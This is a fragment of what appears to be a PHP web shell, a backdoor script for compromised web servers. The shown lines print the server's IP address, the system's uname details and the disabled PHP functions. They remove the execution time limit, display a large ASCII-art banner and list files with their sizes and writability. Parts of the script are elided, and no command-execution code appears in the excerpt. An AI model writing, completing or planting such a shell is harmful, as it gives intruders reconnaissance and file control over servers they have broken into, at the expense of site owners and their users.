...
echo "<b><font color='Black'><br>Server IP : ".gethostbyname($_SERVER['HTTP_HOST'])."</b></font>";
echo "<b><font color='black'><br>".php_uname()."</b></font><br>";
echo "<b><font color='Black'>Disable Functions: $show_ds</b></font><br><br>";
?>
<?php
@session_start();
@set_time_limit(0);
...
<hr width="920" color="Black"/><center><font color="Black" size="2"><pre>
$$\      $$\  $$$$$$\  $$$$$$$\  $$\      $$\       $$\   $$\  $$$$$$\   $$$$$$\  $$\   $$\ $$$$$$$$\ $$$$$$$\
...
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$path/$file")) echo '<font color="black">';
